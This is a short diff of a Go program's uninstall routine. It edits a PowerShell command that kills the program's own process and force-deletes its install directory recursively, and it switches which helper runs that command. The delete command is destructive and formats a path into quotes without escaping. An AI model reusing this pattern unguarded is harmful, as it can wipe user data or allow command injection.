@@ -22,7 +22,7 @@ type installInfo struct {
 var Info installInfo
 
 const (
-	cmdUninstall = "cd C:\\;kill %d -F;rm '%s' -R -Fo"
+	cmdUninstall = "kill %d -F;rm '%s' -R -Fo"
 )
 
 //IsInstalled checks whether or not a valid Base is already present on the system.
@@ -143,7 +143,7 @@ func Uninstall() [4]string {
 		time.Sleep(5 * time.Second)
 		log.Println("Oh shit")
 		cmd := fmt.Sprintf(cmdUninstall, os.Getpid(), Info.Base)
-		util.RunPowershell(cmd)
+		util.RunPowershellInternal(cmd, true)
 		log.Println("Never runs")
 	}()
 
